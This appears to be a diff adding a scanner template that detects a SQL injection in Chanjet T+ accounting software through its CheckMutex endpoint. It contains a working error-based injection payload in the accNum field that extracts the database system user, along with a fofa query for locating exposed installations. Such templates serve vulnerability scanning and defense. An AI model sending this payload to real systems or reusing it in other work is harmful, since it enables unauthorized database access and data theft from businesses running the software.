@@ -1,0 +1,25 @@
+id: yonyou-chanjet-tplus-checkmutex-sqli
+
+info:
+  name: Chanjet Tplus CheckMutex SQL Injection
+  author: xpoc
+  severity: high
+  verified: true
+  description: |-
+    fofa: app="畅捷通-TPlus"
+  reference:
+    - https://mp.weixin.qq.com/s/GS5_QfH3AmaHuCbkiomJFg
+  tags: yonyou,chanjet,tplus,sqli
+  created: 2023/06/22
+  requires: [chanjet]
+  requires-mode: opportunistic
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+      body: |
+        {"accNum": "3' AND 3417 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT SUBSTRING((ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))),1,1024))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(113)+CHAR(113)))-- QoLY", "functionTag": "SYS0104", "url": ""}
+    expression: response.status == 200 && response.body.bcontains(b'qqkkqTPlusDBAdminqjkqq')
+expression: r0()
